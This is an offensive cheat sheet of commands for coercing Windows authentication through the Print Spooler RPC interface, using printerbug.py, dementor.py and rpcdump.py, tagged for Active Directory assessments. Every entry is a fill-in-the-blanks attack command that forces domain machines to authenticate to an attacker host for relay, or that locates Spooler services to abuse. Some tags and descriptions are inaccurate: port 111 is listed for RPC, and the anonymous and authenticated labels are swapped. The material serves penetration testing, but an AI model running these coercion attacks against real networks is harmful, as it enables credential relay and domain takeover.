# printerbug.py

% printerbug, coerce, rpc

# Coerce the SpoolService
#assessment/AD #attack_type/Coerce_Relay #port/111 #protocol/rpc #access/Domain_user
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py

Exploit the SpoolService via RPC to coerce authentication towards the attacker machine.

```bash
printerbug.py "<domain>"/"<user>":"<password>"@<ip> <attacker-ip>
```

# Coerce to multiple targets
#assessment/AD #attack_type/Coerce_Relay #port/111 #protocol/rpc #access/Domain_user
https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py

Exploit the SpoolService via RPC to coerce authentication from multiple targets towards the attacker machine. (A target ip or hostname must still be specified after the @)

```bash
printerbug.py --target-file <target_file> "<domain>"/"<user>":"<password>"@<ip> <attacker-ip>
```

# dementor

## Coerce the SpoolService
#assessment/AD #attack_type/Coerce_Relay #port/111 #protocol/rpc #access/Domain_user

Exploit the SpoolService via RPC to coerce authentication towards the attacker machine.

```bash
dementor.py -d "<domain>" -u "<user>" -p "<password>" <attacker_ip> <ip>
```

# rpcdump

## Finding Spooler services anonymously
#assessment/AD #attack_type/Coerce_Relay #port/111 #protocol/rpc #access/Anonymous

Find Spooler services listening on a remote host.

```bash
rpcdump.py <ip> | grep -A 6 MS-RPRN
```

## Finding Spooler services listening
#assessment/AD #attack_type/Coerce_Relay #port/111 #protocol/rpc #access/Domain_user

Anonymously find Spooler services listening on a remote host.

```bash
rpcdump.py "<domain>"/"<user>":"<password>"@<ip> | grep MS-RPRN
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
